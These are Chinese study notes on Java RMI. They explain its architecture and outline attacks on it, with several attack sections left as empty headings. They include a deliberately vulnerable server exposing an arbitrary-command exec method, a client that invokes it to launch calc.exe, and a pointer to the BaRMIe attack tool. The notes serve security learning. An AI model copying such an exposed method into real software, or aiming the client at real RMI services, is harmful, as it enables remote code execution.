### RMI相关知识总结

#### 介绍

* RMI简介：远程方法调用是分布式编程中的一个基本思想。实现远程方法调用的技术有很多，例如CORBA、WebService，这两种是独立于编程语言的。而Java RMI是专为Java环境设计的远程方法调用机制，远程服务器实现具体的Java方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法并获取执行结果，使分布在不同的JVM中的对象的外表和行为都像本地对象一样。

* RMI的使用场景：

> 假设A公司是某个行业的翘楚，开发了一系列行业上领先的软件。B公司想利用A公司的行业优势进行一些数据上的交换和处理。但A公司不可能把其全部软件都部署到B公司，也不能给B公司全部数据的访问权限。于是A公司在现有的软件结构体系不变的前提下开发了一些RMI方法。B公司调用A公司的RMI方法来实现对A公司数据的访问和操作，而所有数据和权限都在A公司的控制范围内，不用担心B公司窃取其数据或者商业机密。

* RMI由三部分组成：
  * RMI Server 服务端
  * RMI Client 客户端

  * RMI Register RMI Registry就像⼀个⽹关，他⾃⼰是不会执⾏远程⽅法的，但RMI Server可以在上⾯注册⼀个Name 到对象的绑定关系；RMI Client通过Name向RMI Registry查询，得到这个绑定关系，然后再连接RMI Server；最后，远程⽅法实际上在RMI Server上调⽤。

#### 代码示例

Server由三部分构成：

*  ⼀个继承了 java.rmi.Remote 的接⼝，其中定义我们要远程调⽤的函数，⽐如这⾥的 hello()

```java
package com.individuals.RMIServer;

import java.rmi.Remote;
import java.rmi.RemoteException;

public interface IRemoteHelloWorld extends Remote {
    public String hello() throws RemoteException;
}

```

* ⼀个实现了此接⼝的类

```java
package com.individuals.RMIServer;

import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

public class RemoteHelloWorld extends UnicastRemoteObject implements
        IRemoteHelloWorld {
    protected RemoteHelloWorld() throws RemoteException {
        super();
    }
    public String hello() throws RemoteException {
        System.out.println("call from");
        return "Hello world666666";
    }
}
```

* ⼀个主类，⽤来创建Registry，并将上⾯的类实例化后绑定到⼀个地址。这就是我们所谓的Server 了

```java
package com.individuals.RMIServer;

import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;

public class RMIServer {

    private void start() throws Exception {
        RemoteHelloWorld h = new RemoteHelloWorld();
        LocateRegistry.createRegistry(1099);
        Naming.rebind("rmi://127.0.0.1:1099/Hello", h);
    }
    public static void main(String[] args) throws Exception {
        new RMIServer().start();
    }
}

```

客户端较为简单，但是有两点需要注意：

- 使用了继承了 java.rmi.Remote 的接⼝
- 使用Naming.lookup进行查找

```java
package com.individuals.RMIClient;

import com.individuals.RMIServer.IRemoteHelloWorld;
import java.rmi.Naming;
public class TrainMain {
    public static void main(String[] args) throws Exception {
        IRemoteHelloWorld hello = (IRemoteHelloWorld)
                Naming.lookup("rmi://192.168.201.109:1099/Hello");
        String ret = hello.hello();
        System.out.println(ret);
        System.out.println("over!");
    }
}

```

Register在刚刚的例子中，存在感不强，因为通常我们在新建一个RMI Registry的时候，都会 直接绑定一个对象在上面，也就是说我们示例代码中的Server其实包含了Registry和Server两部分

```java
LocateRegistry.createRegistry(1099);
Naming.rebind("rmi://127.0.0.1:1099/Hello", h);
```

如果RMI Registry在本地运行（Register和Server可以不在统一服务器上），那么host和port是可以省略的，此时host默认是 localhost ，port默认是 1099 

 ```java
LocateRegistry.createRegistry(1099);
Naming.rebind("Hello", h);
 ```

如果将Register和Server分开，可以将上面的代码更改为如下：

```java
import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;

public class RMIServer {

    private void start() throws Exception {
        RemoteHelloWorld h = new RemoteHelloWorld();
        // LocateRegistry.createRegistry(1099);
        Naming.rebind("rmi://ip:1099/Hello", h);
    }
    public static void main(String[] args) throws Exception {
        new RMIServer().start();
    }
}
```

```java
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Register {
    public static void main(String[] args) throws RemoteException, InterruptedException {
        Registry registry =  LocateRegistry.createRegistry(1099);
        System.out.println("RMI registry started on port 1099");

        // 保持程序运行
        synchronized (Register.class) {
            Register.class.wait();
        }
    }
}
```



#### RMI的远程调用过程

* 远程方法调用过程中参数的传递和结果的返回：参数或者返回值可以是基本数据类型，当然也有可能是对象的引用。所以这些需要被传输的对象必须可以被序列化，这要求相应的类必须实现 java.io.Serializable 接口，并且客户端的serialVersionUID字段要与服务器端保持一致。
* 远程对象和非远程对象：远程对象是实现了 `java.rmi.Remote` 接口的对象，就是Client执行远程方法需要调用的对象；非远程对象是没有实现 `java.rmi.Remote` 接口的对象，在RMI中一般指的是远程方法调用中的参数和返回值。
* RMI对远程对象和非远程对象的处理方式是不一样的，非远程对象直接以序列化进行传递，远程对象没有被直接传递，而是借助Stub和Skeleton完成远程调用。
* Stub和Skeleton：Client在`Naming.lookup`向Register查找远程对象时，Register返回的是一个远程对象的Stub，Stub基本上相当于是远程对象的引用或者代理（Java RMI使用到了代理模式）。Stub对开发者是透明的，客户端可以像调用本地方法一样直接通过它来调用远程方法。Stub中包含了远程对象的定位信息，如Socket端口、服务端主机地址等等，并实现了远程调用过程中具体的底层网络通信细节，所以RMI远程调用逻辑是这样的：

![image-20240808145051814](./images/image-20240808145051814.png)

* 从逻辑上来说，数据是在Client和Server之间横向流动的，但是实际上是从Client到Stub，然后从Skeleton到Server这样纵向流动的：
  1. Server端监听一个端口，这个端口是JVM随机选择的；
  2. Client端并不知道Server远程对象的通信地址和端口，但是Stub中包含了这些信息，并封装了底层网络操作；
  3. Client端可以调用Stub上的方法；
  4. Stub连接到Server端监听的通信端口并提交参数；
  5. 远程Server端上执行具体的方法，并返回结果给Stub；
  6. Stub返回执行结果给Client端，从Client看来就好像是Stub在本地执行了这个方法一样；
* Regiter和Server的通信：上述的远程调用过程是Client如何调用Server上的方法，但是Client的Stun来自Register，而Register的Stun则来自于Server，当Server实现远程接口的类rebind到Register时，它将会向Register发送Stun。
* **RMI的传输是基于序列化的**

#### JRMP

**JRMP**：Java Remote Message Protocol ，Java 远程消息交换协议。这是运行在Java RMI之下、TCP/IP之上的线路层协议。该协议要求服务端与客户端都为Java编写，就像HTTP协议一样，规定了客户端和服务端通信要满足的规范。

需要指出的是Weblogic采用的是T3协议传而非JRMI协议进行RMI通信。

### 对RMI的几种攻击

#### 攻击存在危险方法的RMI Server

##### 限制

##### 攻击原理

* 远程方法实际上还是在Server上执行的，如果Server本身存在危险方法，则Client可以通过该危险方法主动攻击Server

示例代码如下

```java
// register
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Register {
    public static void main(String[] args) throws RemoteException, InterruptedException {
        Registry registry =  LocateRegistry.createRegistry(1099);
        System.out.println("RMI registry started on port 1099");

        // 保持程序运行
        synchronized (Register.class) {
            Register.class.wait();
        }
    }
}
```

```java
// server
import java.lang.reflect.InvocationTargetException;
import java.rmi.Remote;
import java.rmi.RemoteException;

public interface DangeriousFunc1 extends Remote {
    public void exec(String cmd) throws RemoteException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException;
}

import org.example.remoteInterface.DangeriousFunc1;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.MalformedURLException;
import java.rmi.Naming;
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

// CmdServer的远程方法exec可以接收任意命令并执行
public class CmdServer extends UnicastRemoteObject implements DangeriousFunc1 {
    protected CmdServer() throws RemoteException {
    }

    @Override
    public void exec(String cmd) throws RemoteException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        // 获取Runtime类
        Class<?> clazz = Class.forName("java.lang.Runtime");
// 获取Runtime的方法exec(String str)
        Method execMethod = clazz.getMethod("exec", String.class);
// 获取Rumtime的方法getRuntime()
        Method getRuntimeMethod = clazz.getMethod("getRuntime");
// 执行Runtime.getRuntime()，获取对象runtime
        Object runtime = getRuntimeMethod.invoke(clazz);
// 执行runtime.exec("calc.exe")
        execMethod.invoke(runtime, cmd);
    }

    public static void main(String[] args) throws RemoteException, MalformedURLException {
        CmdServer cmdServer = new CmdServer();
        String host = "rmi://127.0.0.1:1099/";
        Naming.rebind(host+"Cmd", cmdServer);
    }
}
```

```java
// client
import org.example.remoteInterface.DangeriousFunc1;
import java.lang.reflect.InvocationTargetException;
import java.net.MalformedURLException;
import java.rmi.Naming;
import java.rmi.NotBoundException;
import java.rmi.RemoteException;

public class AttackDangerServer {
    public static void main(String[] args) throws MalformedURLException, NotBoundException, RemoteException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, IllegalAccessException {
        DangeriousFunc1 dangeriousFunc1 = (DangeriousFunc1) Naming.lookup("rmi://127.0.0.1:1099/Cmd");
        dangeriousFunc1.exec("calc.exe");
    }
}
```

* 攻击的关键点在于如何探测危险方法，利用工具 BaRMIe [NickstaDB/BaRMIe: Java RMI enumeration and attack tool. (github.com)](https://github.com/NickstaDB/BaRMIe)可以探测目标RMI服务提供的远程对象和其父类

![image-20240809115312759](./images/image-20240809115312759.png)

##### 攻击方法

* 通过目标的公开文档或者相关工具探测危险方法
* 客户端调用远程危险方法

#### 对于RMI的Register进行反序列化攻击

前面说过，RMI的传输是基于序列化的，Client和Register、Client和Server、Server和Register的交互都存在序列化和反序列化的操作，所以在反序列化的过程中就可能会存在反序列化攻击

##### Client攻击Register

##### 限制

##### 攻击原理

##### 攻击方法

##### Server攻击Register

##### 限制

##### 攻击原理

Register和Server可以分开在不同服务器上，Server在bind远程对象到Register时，会发送Stun到Register，而这个过程中存在反序列化的操作。

##### 攻击方法

#### 对于RMI的Client和Server的反序列化攻击

* Register攻击Client
* Server攻击Client
* Client攻击Server

#### 动态加载类攻击

* 对RMI本身的攻击
  * 对于危险方法的调用
  * 序列化攻击
  * 动态加载类
    * 攻击客户端
    * 攻击服务端

### 借助BaRMIe对RMI进行攻击

### 参考

